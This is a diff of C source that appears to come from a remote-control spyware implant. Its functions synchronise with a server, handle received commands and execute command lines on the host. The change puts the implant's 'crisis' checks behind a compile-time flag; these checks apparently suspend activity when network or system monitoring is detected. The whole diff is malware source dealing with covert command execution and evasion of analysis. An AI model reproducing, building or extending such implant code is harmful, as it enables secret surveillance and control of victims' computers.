@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <rcs/lock.h>
 #include <rcs/lock_guard.h>
+#include <config.h>
 #include "common.h"
 #include "H4-DLL.h"
 #include "LOG.h"
@@ -95,8 +96,14 @@ BOOL WINAPI DA_Syncronize(BYTE* action_param)
 	DWORD dummy;
 
 	// Verifica che ci sia il parametro e che non siamo in momento di crisi
+#ifdef __ENABLE_CRISIS_MODULE
 	if (!action_param || IsCrisisNetwork())
 		return FALSE;
+#else
+	if (!action_param)
+		return FALSE;
+#endif
+
 
 	// asp_server e unique_id devono essere entrambe NULL
 	// terminated. Deve essere cura del server inviare una
@@ -139,11 +146,12 @@ BOOL WINAPI DA_Syncronize(BYTE* action_param)
 		if (availables[i] == PROTO_COMMANDS)
 			LOG_HandleCommands();
 
-
+#ifdef __ENABLE_CRISIS_MODULE
 		if (IsCrisisNetwork())
 			break; // Cosi' se aveva ricevuto la nuova configurazione, la attiva
 				   // Tanto l'unica cosa che rimane e' l'invio dei log, che controllano
 				   // la crisi e in caso chiudono tutto
+#endif
 	}
 
 	// Sospende tutti gli agent e l'agent manager.
@@ -248,8 +256,14 @@ BOOL WINAPI DA_Execute(BYTE* command)
 	// Verifica che ci sia il comando 
 	// N.B. Deve essere NULL terminato!!!
 	// e Verifica che non siamo in periodo di crisi 
+#ifdef __ENABLE_CRISIS_MODULE
 	if (!command || IsCrisisSystem())
 		return FALSE;
+#else
+	if (!command)
+		return FALSE;
+#endif
+
 
 	if (!HM_ExpandStrings((char*)command, cmd_line, sizeof(cmd_line)))
 		strcpy(cmd_line, (char*)command);
